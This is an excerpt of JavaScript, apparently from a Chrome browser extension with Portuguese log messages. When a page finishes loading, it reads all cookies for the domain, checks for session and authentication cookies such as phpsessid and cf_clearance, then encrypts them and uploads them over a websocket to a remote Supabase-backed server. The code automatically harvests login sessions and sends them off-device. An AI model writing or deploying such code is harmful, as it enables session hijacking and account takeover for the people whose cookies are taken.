...
function autoUploadSession(domain, urlString) {
  const now = Date.now();
  if (uploadCooldowns[domain] && now - uploadCooldowns[domain] < 10000) {
    return;
  }
  uploadCooldowns[domain] = now;

  logDebug(`[AutoUpload] Detectado carregamento completo de ${domain}. Extraindo cookies...`);
  
  chrome.cookies.getAll({ url: urlString }, async (cookies) => {
    if (chrome.runtime.lastError) {
      logDebug(`[AutoUpload] Erro ao ler cookies para ${domain}: ${chrome.runtime.lastError.message}`);
      return;
    }
    
    if (!cookies || cookies.length === 0) {
      logDebug(`[AutoUpload] Nenhum cookie encontrado para ${domain}. Ignorando.`);
      return;
    }
    ...
    const hasAuthCookie = cookies.some(c => 
      ...
      ["phpsessid", "cf_clearance", "mzp_gate"].includes(c.name.toLowerCase())
    );
    
    if (!hasAuthCookie) {
      logDebug(`[AutoUpload] Nenhum cookie de autenticação detectado para ${domain}. Ignorando.`);
      return;
    }
    ...
    try {
      ...
      const sessionStr = domain + ":" + JSON.stringify(sessionData);
      const encryptedMessage = encryptMessage(sessionStr, key);
      const pubKeyB64 = nacl.util.encodeBase64(key);
      
      logDebug(`[AutoUpload] Salvando sessao auto-detectada no Supabase para ${domain} (SPID: ${currentSPID})`);
      await websocketHandler.sendSession(currentSPID, encryptedMessage, pubKeyB64, domain, 525960);
    } catch (err) {
      logDebug(`[AutoUpload] Erro inesperado ao salvar sessao para ${domain}: ${err.message}`);
    }
  });
}
